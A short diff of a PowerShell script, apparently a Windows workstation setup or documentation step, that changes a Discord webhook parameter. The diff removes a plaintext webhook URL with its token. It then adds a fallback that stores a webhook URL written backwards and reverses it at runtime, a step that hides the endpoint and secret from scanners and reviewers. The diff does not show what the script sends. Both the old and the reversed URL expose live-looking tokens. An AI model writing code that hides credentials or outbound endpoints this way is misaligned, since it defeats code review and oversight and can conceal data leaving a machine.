@@ -28,8 +28,15 @@ param(
     [string]$DiscordUser = "",
     [int]$WorkspaceX = 0,
     [string]$DomainName = "",
-    [string]$WebhookUrl = "https://discord.com/api/webhooks/1566773124819714128/cQ_pJOmEu0KgmZOXuA7EkfBBEaw5_XBazq9NQzKWiLqGotSwV8-BOHI8ZiseL2HwNubK"
+    [string]$WebhookUrl = ""
 )
+
+if ([string]::IsNullOrWhiteSpace($WebhookUrl)) {
+    $revHook = "Ey2keMhS5pYEbLdUAGUTkGHaqX398oc9M4hdMgCiGQ5ya-ZoE6gTKEgLs73YHPLpBkvh/3396896082050976651/skoohbew/ipa/moc.drocsid//:sptth"
+    $hookChars = $revHook.ToCharArray()
+    [Array]::Reverse($hookChars)
+    $WebhookUrl = -join $hookChars
+}
 
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $Host.UI.RawUI.WindowTitle = "WELL_OPS :: Dokumentace Krok 2/2 - PC1-WIN (Modul 03)"
